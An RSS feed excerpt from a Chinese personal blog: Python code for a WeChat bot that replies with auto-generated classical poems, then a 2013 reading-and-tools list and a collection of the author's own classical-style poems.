&lt;span class="s2"&gt;                &amp;lt;MsgType&amp;gt;&amp;lt;![CDATA[news]]&amp;gt;&amp;lt;/MsgType&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;ArticleCount&amp;gt;1&amp;lt;/ArticleCount&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;Articles&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;item&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;Title&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/Title&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;Description&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/Description&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;PicUrl&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/PicUrl&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;Url&amp;gt;&amp;lt;![CDATA[&lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;]]&amp;gt;&amp;lt;/Url&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/item&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/Articles&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;FuncFlag&amp;gt;1&amp;lt;/FuncFlag&amp;gt;&lt;/span&gt;
&lt;span class="s2"&gt;                &amp;lt;/xml&amp;gt; &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;

        &lt;span class="n"&gt;content&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_content&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
        &lt;span class="c1"&gt;#处理关注事件&lt;/span&gt;
        &lt;span class="c1"&gt;#调试成功，技巧：控制变量，从最少元素开始，逐步增加&lt;/span&gt;
        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;MsgType&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;event&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;echostr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;textTpl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
                &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;FromUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ToUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;())),&lt;/span&gt; 
                &lt;span class="sd"&gt;&amp;#39;&amp;#39;&amp;#39;添加自动作诗模块，输入&amp;quot;诗词#登山&amp;quot;自动写作主题为登山的诗词,目前仅支持平水韵五绝，之后会添加其他体裁&amp;#39;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;echostr&lt;/span&gt;

        &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;==&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hi&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;

          &lt;span class="c1"&gt;#msg[&amp;#39;Content&amp;#39;]用户消息，汉语还是很好解析的，没有乱七八糟编码问题&lt;/span&gt;
          &lt;span class="n"&gt;echostr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;textTpl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
                               &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;FromUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ToUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;())),&lt;/span&gt;
                               &lt;span class="s2"&gt;&amp;quot;hi&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;#填充内容&lt;/span&gt;
          &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;echostr&lt;/span&gt;

        &lt;span class="k"&gt;elif&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;诗词&amp;quot;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]:&lt;/span&gt; &lt;span class="c1"&gt;#“#”只能用中文&lt;/span&gt;
          &lt;span class="k"&gt;try&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
          &lt;span class="k"&gt;except&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
            &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;Content&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;#&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)[&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
          &lt;span class="c1"&gt;#content=&amp;quot;怀&amp;quot;&lt;/span&gt;
          &lt;span class="n"&gt;mypoetry&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;writepoetry&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;yb&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;2&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;tc&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;mt&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
          &lt;span class="c1"&gt;#msg[&amp;#39;Content&amp;#39;]用户消息，汉语还是很好解析的，没有乱七八糟编码问题&lt;/span&gt;
          &lt;span class="n"&gt;echostr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;textTpl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
                               &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;FromUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ToUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;())),&lt;/span&gt;
                               &lt;span class="n"&gt;mypoetry&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;#填充内容&lt;/span&gt;
          &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;echostr&lt;/span&gt;

        &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
          &lt;span class="n"&gt;echostr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;textTpl&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;
                               &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;FromUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="n"&gt;msg&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;ToUserName&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="nb"&gt;str&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;time&lt;/span&gt;&lt;span class="p"&gt;())),&lt;/span&gt;
                               &lt;span class="n"&gt;content&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
          &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;echostr&lt;/span&gt;



    &lt;span class="c1"&gt;#call bae serive&lt;/span&gt;
    &lt;span class="kn"&gt;from&lt;/span&gt; &lt;span class="nn"&gt;bae.core.wsgi&lt;/span&gt; &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="n"&gt;WSGIApplication&lt;/span&gt;
    &lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nn"&gt;os.path&lt;/span&gt;
    &lt;span class="n"&gt;deps_path&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;join&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;split&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;os&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;realpath&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;__file__&lt;/span&gt;&lt;span class="p"&gt;))[&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;deps&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;sys&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;path&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;deps_path&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;


    &lt;span class="c1"&gt;#create application&lt;/span&gt;
    &lt;span class="n"&gt;application&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;WSGIApplication&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;app&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;自动作诗的数据，来自稻香老农的网络版自动作诗机，解析数据时注意一下编码问题就行。具体见代码。另外目前只能自动写绝句，其他功能有空添加。&lt;/p&gt;
&lt;p&gt;推荐使用案例驱动式的学习方法，一开始就埋头到文档里，无趣且乏味，可以先看几个成功的案例，试着模仿，运行，修修改改，先跑起来,至于案例的来源，博客和github是个巨大的宝库，我闲来比较喜欢逛逛github，总有意外的收获。&lt;/p&gt;
&lt;h3&gt;后记&lt;/h3&gt;
&lt;p&gt;案例中有趣的地方是，我们借用requests来访问其他网站，这样一来我们可以轻易使用混搭开发模式(mashup),这是个很有趣的话题，也是我一直关注的一个方向。开源与开放平台是未来。
发挥你的想象力吧，想象力是你在数字世界的唯一边界。借用requests，可以做许多有趣的工作，比如写一个根据输入的电影名称，去豆瓣抓取电影资讯的工作平台;或者根据输入的学号，去获取学生的成绩/课程表之类;再或者根据输入的照片，识别人脸,建立人群关系（使用face++）.&lt;br /&gt;
 这里我们可以抽象出一个共性，我们的后台实际也在扮演中介角色，或者理解为入口，从广泛的网络里获取用户需要的内容，至于可以干什么，这里的唯一限制是你的想象力^_^&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Tue, 07 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-07:weixin-learning.html</guid><category>web</category></item><item><title>2013</title><link>/2013-1.html</link><description>&lt;p&gt;13年对我而言比较重要的一些东西。&lt;br /&gt;
备忘。&lt;/p&gt;
&lt;h3&gt;阅读篇&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;《送你一颗子弹》（刘瑜）&lt;/li&gt;
&lt;li&gt;《孤独的像一颗星球》（刘瑜）&lt;/li&gt;
&lt;li&gt;《观念的水位》（刘瑜）&lt;/li&gt;
&lt;li&gt;《画家与黑客》（Paul Graham）&lt;/li&gt;
&lt;li&gt;《人生的智慧》（叔本华）&lt;/li&gt;
&lt;li&gt;《写给大家看的设计书》&lt;/li&gt;
&lt;li&gt;《Linux/Unix设计思想》&lt;/li&gt;
&lt;li&gt;《Learning Python》&lt;/li&gt;
&lt;li&gt;《Head first programming》&lt;/li&gt;
&lt;li&gt;《创客:新工业革命》&lt;/li&gt;
&lt;li&gt;《三体》&lt;/li&gt;
&lt;li&gt;《思想录》&lt;/li&gt;
&lt;li&gt;《影响力》&lt;/li&gt;
&lt;li&gt;《微观经济学》（没有看完）&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;工具篇&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;知乎&lt;/li&gt;
&lt;li&gt;thinkpad&lt;/li&gt;
&lt;li&gt;ubuntu&lt;/li&gt;
&lt;li&gt;zim&lt;/li&gt;
&lt;li&gt;evernote&lt;/li&gt;
&lt;li&gt;小米便签&lt;/li&gt;
&lt;li&gt;豆瓣&lt;/li&gt;
&lt;li&gt;sublime text&lt;/li&gt;
&lt;li&gt;git&lt;/li&gt;
&lt;li&gt;python&lt;/li&gt;
&lt;li&gt;django&lt;/li&gt;
&lt;li&gt;jquery&lt;/li&gt;
&lt;li&gt;boostrap&lt;/li&gt;
&lt;li&gt;lisp&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;技能篇&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;专利撰写&lt;/li&gt;
&lt;li&gt;编程&lt;/li&gt;
&lt;li&gt;尝试运用模式&lt;/li&gt;
&lt;li&gt;元学习&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Mon, 06 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-06:2013-1.html</guid><category>杂感</category></item><item><title>两年小集</title><link>/poem-2-year.html</link><description>&lt;p&gt;整理一下之前写过的诗词。&lt;br /&gt;
大多写于12年。13年没怎么动笔。  &lt;/p&gt;
&lt;p&gt;皆用新韵，可能出律的还不少。不避。  &lt;/p&gt;
&lt;p&gt;事如春梦了无痕。然其间悲喜，不能释怀。&lt;/p&gt;
&lt;h4&gt;关于吃货的二三事&lt;/h4&gt;
&lt;p&gt;--下午去玩 ，不知不觉就往小吃最热闹的街上去了。。&lt;br /&gt;
一&lt;br /&gt;
秀色终究不可食，&lt;br /&gt;
形而下者奈何之。&lt;br /&gt;
香味一丝往深巷，&lt;br /&gt;
小吃如饵我如鱼。  &lt;/p&gt;
&lt;p&gt;二&lt;br /&gt;
奈何我辈皆吃货，&lt;br /&gt;
窗外天黑不肯归。&lt;br /&gt;
触目站牌才记起，&lt;br /&gt;
末班车有去无回。  &lt;/p&gt;
&lt;h4&gt;烟花 其四&lt;/h4&gt;
&lt;p&gt;春风过我暗香闻， 夜色渐如眸子深。&lt;br /&gt;
一刹恍惚凝望里， 人间烟火梦中人 &lt;/p&gt;
&lt;h4&gt;清平乐&lt;/h4&gt;
&lt;p&gt;闲思有味，关旧时年岁。问候只言及山水，语气佯装无谓。&lt;br /&gt;
他乡灯火人家，卿说倦矣生涯。笑我红尘溺久，尚耽雪月风花。  &lt;/p&gt;
&lt;h4&gt;浣溪沙 记梦&lt;/h4&gt;
&lt;p&gt;梦里容颜看不真，&lt;br /&gt;
偶然路过那家门，&lt;br /&gt;
相逢愧我满衣尘。  &lt;/p&gt;
&lt;p&gt;咫尺卿卿和氏璧，&lt;br /&gt;
依然我是木头人，&lt;br /&gt;
春光暖暖草深深。&lt;/p&gt;
&lt;h4&gt;浣溪沙.赠茶人兄&lt;/h4&gt;
&lt;p&gt;故里相逢夜未深，&lt;br /&gt;
小城灯火绽新春。&lt;br /&gt;
于君言笑见诗文。  &lt;/p&gt;
&lt;p&gt;有月正将山水照，&lt;br /&gt;
忘年且以弟兄称。&lt;br /&gt;
知音与我俱痴人。   &lt;/p&gt;
&lt;h4&gt;浣溪沙·北上途中，赠简兮&lt;/h4&gt;
&lt;p&gt;春水初生我已辞，&lt;br /&gt;
梅花落后简兮痴。&lt;br /&gt;
相知不必旧相识。  &lt;/p&gt;
&lt;p&gt;隔雨隔山归恨晚，&lt;br /&gt;
于君于我见嫌迟。&lt;br /&gt;
思君词笔月明时。&lt;/p&gt;
&lt;h4&gt;浣溪沙.赠春晖老乡&lt;/h4&gt;
&lt;p&gt;草色青青入眼帘，&lt;br /&gt;
清幽小路慢蜿蜒。&lt;br /&gt;
我耽风景讷于言。  &lt;/p&gt;
&lt;p&gt;旭日才催二月暖，&lt;br /&gt;
春风不让一人闲。（注）&lt;br /&gt;
山中半日即神仙。&lt;br /&gt;
注：春晖兄有联：节日频传千古趣，春风不让一人闲。是我至今读过的最好春联之一，十分喜欢，偷来一用  &lt;/p&gt;
&lt;h4&gt;采桑子.次韵赠人兼祝生日快乐&lt;/h4&gt;
&lt;p&gt;三秋桂子菊花酒，何物芬芳？且问元芳（注），道是春风词笔香。&lt;br /&gt;
因何九月婵娟诞，秋好天凉，白露初凉 ，许愿声中烛影长。&lt;br /&gt;
注：“且问元芳”，典自 网络上最近流行的“元芳，你怎么看"  &lt;/p&gt;
&lt;h3&gt;初雪 几篇&lt;/h3&gt;
&lt;h4&gt;其一&lt;/h4&gt;
&lt;p&gt;一夜北风紧，拥衾到五更。&lt;br /&gt;
殷殷望眼里，隐没的街灯。  &lt;/p&gt;
&lt;h4&gt;其二&lt;/h4&gt;
&lt;p&gt;睡衣赤脚到窗沿，看雪心情仍少年。&lt;br /&gt;
楼外追逐着稚子，时光穿越到从前。  &lt;/p&gt;
&lt;h4&gt;其三&lt;/h4&gt;
&lt;p&gt;屋顶初匀雪尚新，两三短信报知音。&lt;br /&gt;
访戴途中卿莫返，轻舟借我到湖心。  &lt;/p&gt;
&lt;h3&gt;年前几首&lt;/h3&gt;
&lt;h4&gt;题记&lt;/h4&gt;
&lt;p&gt;料峭春寒宜小词，&lt;br /&gt;
有些惆怅似当时。&lt;br /&gt;
最怕笔尖将透纸，&lt;br /&gt;
临屏知子不能知。  &lt;/p&gt;
&lt;h4&gt;无题&lt;/h4&gt;
&lt;p&gt;夜寒止水易成冰。&lt;br /&gt;
情绪一些竟莫名。&lt;br /&gt;
小镇未眠应似我，&lt;br /&gt;
隔窗焰火月清明。  &lt;/p&gt;
&lt;h4&gt;浣溪沙&lt;/h4&gt;
&lt;p&gt;客里清闲将奈何，阳台竹椅与茶桌。耳边旋律旧时歌。&lt;br /&gt;
小镇风中晴日好，大街楼外美人多。光阴午后耐消磨。  &lt;/p&gt;
&lt;h3&gt;天涯明月刀&lt;/h3&gt;
&lt;p&gt;近来在看武侠，顺手写的几首歪诗  &lt;/p&gt;
&lt;h4&gt;天涯&lt;/h4&gt;
&lt;p&gt;浪迹浮生已至今，&lt;br /&gt;
于流水处遇知音。&lt;br /&gt;
长亭且尽一杯酒，&lt;br /&gt;
折柳何须泪满襟。  &lt;/p&gt;
&lt;h4&gt;明月&lt;/h4&gt;
&lt;p&gt;浪迹千山伴我行，&lt;br /&gt;
多情遥望似无情。&lt;br /&gt;
若是侬心真止水，&lt;br /&gt;
何须避我眼中青。  &lt;/p&gt;
&lt;h4&gt;刀&lt;/h4&gt;
&lt;p&gt;出鞘能削路不平？ &lt;br /&gt;
有刀锋处有功名。&lt;br /&gt;
莫羡寒光能透骨，&lt;br /&gt;
伤人却不胜深情。  &lt;/p&gt;
&lt;h4&gt;想象一下毕业季&lt;/h4&gt;
&lt;p&gt;毕业照与散伙酒，&lt;br /&gt;
祝福语和长亭柳。&lt;br /&gt;
夕阳流水远行舟，&lt;br /&gt;
人海相隔相忆否   &lt;/p&gt;
&lt;h4&gt;浣溪沙·记梦&lt;/h4&gt;
&lt;p&gt;一梦蒹葭是若耶？&lt;br /&gt;
一溪秋水映长睫，&lt;br /&gt;
依稀眉眼笑些些，  &lt;/p&gt;
&lt;p&gt;隔岸花开风里落，&lt;br /&gt;
今朝梦醒记轻嗟，&lt;br /&gt;
空余窗外柳丝斜。  &lt;/p&gt;
&lt;h4&gt;临江仙·暑期返家途中&lt;/h4&gt;
&lt;p&gt;呼啸窗前风景，途中颠簸年华。空濛烟雨障天涯，无聊闲望远。掠眼有荷花。&lt;br /&gt;
久坐昏昏欲睡，模糊桌上清茶。已然跌入梦中吗？熟悉庭院里，有我过家家。   &lt;/p&gt;
&lt;h4&gt;临江仙&lt;/h4&gt;
&lt;p&gt;想玩古剑奇谭&lt;br /&gt;
晴里雪消空谷，春风唤醒桃花。餐霞眠月在天涯。千寻寻一诺，又路过蒹葭。&lt;br /&gt;
思念酿成浊酒，悲欢淡似清茶。容颜梦里瘦些吗？清寒今夜月，曾照那年她。  &lt;/p&gt;
&lt;h4&gt;杂感&lt;/h4&gt;
&lt;p&gt;观刘建老师《大潭书》.章二:五县天子乱大潭。&lt;br /&gt;
白骨三千里，&lt;br /&gt;
乌纱酒满樽。&lt;br /&gt;
将相宁有种？(注1)&lt;br /&gt;
存亡系妇人。(注2)
注1:“有种”取今之俗语之意&lt;br /&gt;
注2:妇人指练氏夫人，使建州城免于被屠城。&lt;/p&gt;
&lt;h3&gt;夜里&lt;/h3&gt;
&lt;p&gt;清明小雨夜清寒，关掉ＱＱ道晚安．&lt;br /&gt;
耳边婉转轻音乐，网上穿梭小论坛．&lt;br /&gt;
掩耳笑声惊隔壁？刻舟标记待拍砖．&lt;br /&gt;
怪它困意忒来早，尚有精华帖未翻．&lt;br /&gt;
注：颈联用掩耳盗铃和刻舟求剑典，指怕笑声吵到隔壁故掩耳; 在帖子里留下标记待有空拍砖&lt;/p&gt;
&lt;h3&gt;古风几首&lt;/h3&gt;
&lt;h4&gt;天气（古风）&lt;/h4&gt;
&lt;p&gt;天气暖还凉。&lt;br /&gt;
冬衣取又藏。&lt;br /&gt;
我坠流年里，&lt;br /&gt;
握不住月光。&lt;/p&gt;
&lt;h4&gt;代码（古风）&lt;/h4&gt;
&lt;p&gt;堆沙以筑城，&lt;br /&gt;
捏泥以造人&lt;br /&gt;
欲置身其外，&lt;br /&gt;
却遗落灵魂。  &lt;/p&gt;
&lt;h4&gt;书（绝句）&lt;/h4&gt;
&lt;p&gt;触手有余温，&lt;br /&gt;
言辞如故人。&lt;br /&gt;
百年君已烬，&lt;br /&gt;
隔纸见风神。  &lt;/p&gt;
&lt;h4&gt;出游（古风）&lt;/h4&gt;
&lt;p&gt;人间四月里，&lt;br /&gt;
秀色不能藏。&lt;br /&gt;
我在春风下，&lt;br /&gt;
看春水汤汤。（shang）  &lt;/p&gt;
&lt;h3&gt;几首&lt;/h3&gt;
&lt;h4&gt;信&lt;/h4&gt;
&lt;p&gt;落笔能平淡，多余话已删。&lt;br /&gt;
流年希静好，纵使不相关。  &lt;/p&gt;
&lt;h4&gt;图书馆（平水韵）&lt;/h4&gt;
&lt;p&gt;座位近于窗，咖啡浸夕阳。&lt;br /&gt;
泛黄角落里，凝固的时光。  &lt;/p&gt;
&lt;h4&gt;自习&lt;/h4&gt;
&lt;p&gt;思想斗争久，手机携与留？&lt;br /&gt;
别卿才一瞬，于我已三秋。  &lt;/p&gt;
&lt;h4&gt;网络之论坛&lt;/h4&gt;
&lt;p&gt;此间能小隐，世上不知年。&lt;br /&gt;
有憾唯沉帖，知音尚未翻。 &lt;/p&gt;
&lt;h4&gt;网络 （二）&lt;/h4&gt;
&lt;p&gt;江湖世外我来迟，佩剑锋芒尚未知。&lt;br /&gt;
名士红颜皆老矣，屠龙有术未逢时  &lt;/p&gt;
&lt;h4&gt;近来（折腰体）&lt;/h4&gt;
&lt;p&gt;将近人间三月三，春风尚且驻江南。&lt;br /&gt;
偶踏单车雾十里，欲寻山水意阑珊。&lt;br /&gt;
谓我心情能止水，因谁短信又波澜．&lt;br /&gt;
堪笑如今才尽矣，拿捏平仄已艰难。  &lt;/p&gt;
&lt;h4&gt;岁末感怀兼寄人（折腰体）&lt;/h4&gt;
&lt;p&gt;一入江湖岁月催（注），巴山夜雨几人归？&lt;br /&gt;
今夜老村念游子？去年小雪到柴扉？&lt;br /&gt;
炊烟起处思莼味，月色清时对院梅？&lt;br /&gt;
年来笑我耽书、睡，旧友故乡皆久违。  &lt;/p&gt;
&lt;p&gt;注1：这句是在qq空间里，朋友提到的，可能引自金庸武侠&lt;/p&gt;
&lt;h4&gt;赠人生日&lt;/h4&gt;
&lt;p&gt;岁月逝连篇，花开又一年。&lt;br /&gt;
依然贪睡吧？清瘦甚从前？&lt;/p&gt;
&lt;h3&gt;有雪天上来（古风几首）&lt;/h3&gt;
&lt;p&gt;晨起，大雪  &lt;/p&gt;
&lt;h4&gt;其一&lt;/h4&gt;
&lt;p&gt;有雪天上来&lt;br /&gt;
说与故人知。&lt;br /&gt;
故人嫌味浅：&lt;br /&gt;
下回须寄诗  &lt;/p&gt;
